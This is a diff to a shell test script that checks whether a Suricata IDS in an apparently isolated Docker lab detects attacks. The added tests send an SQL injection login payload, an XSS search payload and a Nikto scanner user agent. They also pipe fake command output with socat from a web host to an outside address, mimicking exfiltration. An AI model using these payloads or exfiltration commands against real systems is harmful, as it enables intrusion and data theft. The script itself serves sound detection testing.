@@ -58,7 +58,7 @@ docker exec -d "${P}-attacker" socat TCP-LISTEN:4444,fork,reuseaddr "SYSTEM:echo
 sleep 1
 
 echo "== Service"
-# suricata -D kehrt vor dem Laden der Regeln zurueck: bis 30 s auf den Start warten
+# Nach einem Neustart laedt Suricata die Regeln einige Sekunden lang: bis 30 s auf den Start warten
 for _ in $(seq 30); do
   x ids grep -q 'Engine started' /var/log/suricata/suricata.log 2>/dev/null && break
   sleep 1
@@ -67,7 +67,7 @@ if x ids pgrep -f 'suricata --include' >/dev/null 2>&1; then r=ok; else r=fail; 
 result I-00 "Suricata running" ok "$r"
 result I-00 "version 8.0" yes "$(has "$(x ids suricata -V 2>&1)" 'version 8\.0\.')"
 log=$(x ids cat /var/log/suricata/suricata.log 2>/dev/null)
-result I-00 "3 own rules loaded, none failed" yes "$(has "$log" ' 3 rules successfully loaded, 0 rules failed')"
+result I-00 "7 own rules loaded, none failed" yes "$(has "$log" ' 7 rules successfully loaded, 0 rules failed')"
 result I-00 "engine started" yes "$(has "$log" 'Engine started')"
 if x ids test -e /var/lib/suricata/rules/suricata.rules; then r=yes; else r=no; fi
 result I-00 "no third-party rule set in image (E-08)" no "$r"
@@ -94,6 +94,21 @@ n0=$(events alert '"signature_id":1000003,' '"src_ip":"10.10.10.10"' '"dest_port
 if side web socat -T1 /dev/null TCP:192.0.2.10:4444,connect-timeout=2 >/dev/null 2>&1; then r=ok; else r=fail; fi
 result I-05 "web -> 192.0.2.10 TCP 4444 blocked by fw-dmz (V-12)" fail "$r"
 result I-05 "blocked attempt still detected (SID 1000003)" yes "$(waitfor $((n0 + 1)) alert '"signature_id":1000003,' '"src_ip":"10.10.10.10"' '"dest_port":4444')"
+
+x attacker curl -sk -o /dev/null --data-urlencode "username=admin' OR '1'='1" --data-urlencode "password=x" "https://203.0.113.2/login?m=$M-7"
+result I-07 "SQL injection in the login form detected (SID 1000004)" yes "$(waitfor 1 alert '"signature_id":1000004,' "m=$M-7" '"xff":"192.0.2.10"')"
+
+x attacker curl -sk -o /dev/null -G --data-urlencode "q=<script>alert(1)</script>" "https://203.0.113.2/search?m=$M-8"
+result I-08 "cross-site scripting detected (SID 1000005)" yes "$(waitfor 1 alert '"signature_id":1000005,' "m=$M-8" '"xff":"192.0.2.10"')"
+
+x attacker curl -sk -o /dev/null -A "Nikto/2.5.0" "https://203.0.113.2/?m=$M-9"
+result I-09 "scanner user agent detected (SID 1000006)" yes "$(waitfor 1 alert '"signature_id":1000006,' "m=$M-9" '"xff":"192.0.2.10"')"
+
+docker exec -d "${P}-attacker" socat TCP-LISTEN:443,reuseaddr "SYSTEM:sleep 2"
+sleep 0.5
+n0=$(events alert '"signature_id":1000007,' '"src_ip":"10.10.10.10"' '"dest_ip":"192.0.2.10"')
+side web sh -c 'echo "uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)" | socat -T2 - TCP:192.0.2.10:443,connect-timeout=2' >/dev/null 2>&1
+result I-10 "command output leaving the DMZ detected (SID 1000007)" yes "$(waitfor $((n0 + 1)) alert '"signature_id":1000007,' '"src_ip":"10.10.10.10"' '"dest_ip":"192.0.2.10"')"
 
 x attacker curl -sk -o /dev/null "https://203.0.113.2/suche?q=hallo&m=$M-6"
 result I-06 "normal request is seen (http event)" yes "$(waitfor 1 http "m=$M-6")"
